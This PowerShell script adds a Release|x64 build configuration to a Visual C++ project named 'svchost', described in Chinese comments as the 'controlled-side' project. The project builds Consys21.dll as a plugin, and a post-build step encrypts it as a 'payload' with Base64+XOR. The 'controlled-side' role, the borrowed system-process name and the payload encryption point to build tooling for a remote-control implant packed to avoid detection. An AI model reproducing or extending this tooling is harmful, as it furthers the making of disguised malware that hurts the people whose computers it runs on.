# 为 Server\svchost 被控工程添加 Release|x64 配置（保留 Win32）
$ErrorActionPreference='Stop'
$root="C:\Users\Administrator\Desktop\本机研究原理"
$f=Join-Path $root 'Server\svchost\svchost.vcxproj'

$raw=[IO.File]::ReadAllText($f)
$eol = if($raw.Contains("`r`n")){"`r`n"}else{"`n"}
$lines=New-Object 'System.Collections.Generic.List[string]'
foreach($l in ($raw -split "`r?`n")){ [void]$lines.Add($l) }

function Block($s){ [string[]]@($s -split "`r?`n" | Where-Object { $_ -ne '' }) }
function Find-Index($pred){ for($i=0;$i -lt $lines.Count;$i++){ if(& $pred $lines[$i]){ return $i } }; throw "anchor not found" }
function Insert-Before($idx,$blk){ $lines.InsertRange($idx,[string[]]@($blk)) }

$pc = Block @'
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
'@
$cfg = Block @'
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>DynamicLibrary</ConfigurationType>
    <PlatformToolset>v142</PlatformToolset>
    <UseOfMfc>false</UseOfMfc>
    <CharacterSet>MultiByte</CharacterSet>
  </PropertyGroup>
'@
$psg = Block @'
  <ImportGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="PropertySheets">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
    <Import Project="$(VCTargetsPath)Microsoft.Cpp.UpgradeFromVC60.props" />
  </ImportGroup>
'@
$out = Block @'
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <OutDir>.\Release_x64\</OutDir>
    <IntDir>.\Release_x64\</IntDir>
    <LinkIncremental>false</LinkIncremental>
  </PropertyGroup>
'@
$idg = Block @'
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <RuntimeLibrary>MultiThreadedDLL</RuntimeLibrary>
      <InlineFunctionExpansion>Default</InlineFunctionExpansion>
      <StringPooling>true</StringPooling>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <Optimization>MaxSpeed</Optimization>
      <SuppressStartupBanner>true</SuppressStartupBanner>
      <WarningLevel>TurnOffAllWarnings</WarningLevel>
      <AdditionalIncludeDirectories>../../common;%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
      <PreprocessorDefinitions>WIN32;_WIN64;NDEBUG;_DLL;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <AssemblerListingLocation>.\Release_x64\</AssemblerListingLocation>
      <PrecompiledHeaderOutputFile>.\Release_x64\svchost.pch</PrecompiledHeaderOutputFile>
      <ObjectFileName>.\Release_x64\</ObjectFileName>
      <ProgramDataBaseFileName>.\Release_x64\</ProgramDataBaseFileName>
      <AdditionalOptions>/Zc:forScope- %(AdditionalOptions)</AdditionalOptions>
    </ClCompile>
    <Midl>
      <TypeLibraryName>.\Release_x64\svchost.tlb</TypeLibraryName>
    </Midl>
    <Bscmake>
      <SuppressStartupBanner>true</SuppressStartupBanner>
      <OutputFile>.\Release_x64\svchost.bsc</OutputFile>
    </Bscmake>
    <Link>
      <LinkDLL>true</LinkDLL>
      <SubSystem>Console</SubSystem>
      <OutputFile>../../Bin/Plugins/Consys21.dll</OutputFile>
      <ImportLibrary>.\Release_x64\Consys21.lib</ImportLibrary>
      <AdditionalDependencies>odbc32.lib;odbccp32.lib;../../common/zlib/zlib_x64_md.lib;Shlwapi.lib;%(AdditionalDependencies)</AdditionalDependencies>
    </Link>
    <PostBuildEvent>
      <Command>powershell -NoProfile -ExecutionPolicy Bypass -File "$(SolutionDir)tools\Encrypt-Payload.ps1" -In "$(SolutionDir)Bin\Plugins\Consys21.dll" -Out "$(SolutionDir)Bin\Plugins\Consys21.enc"
if errorlevel 1 echo [warn] Consys21 payload encryption skipped
exit /b 0</Command>
      <Message>Encrypt Consys21.dll -&gt; Consys21.enc (Base64+XOR)</Message>
    </PostBuildEvent>
  </ItemDefinitionGroup>
'@

$idgEnd = Find-Index { param($l) $l.Contains('</ItemDefinitionGroup>') }
$nextItem=$idgEnd+1
while(-not $lines[$nextItem].Contains('<ItemGroup>')){ $nextItem++ }
Insert-Before $nextItem $idg
$outAnchor = Find-Index { param($l) $l.Contains('ItemDefinitionGroup') -and $l.Contains('Release|Win32') }
Insert-Before $outAnchor $out
$psgAnchor = Find-Index { param($l) $l.Contains('Label="UserMacros"') }
Insert-Before $psgAnchor $psg
$cfgAnchor = Find-Index { param($l) $l.Contains('Microsoft.Cpp.props') }
Insert-Before $cfgAnchor $cfg
$pcAnchor = Find-Index { param($l) $l.Trim() -eq '</ItemGroup>' }
Insert-Before $pcAnchor $pc

[IO.File]::WriteAllText($f,($lines -join $eol),(New-Object Text.UTF8Encoding($true)))
"svchost 被控 x64 配置已写入"
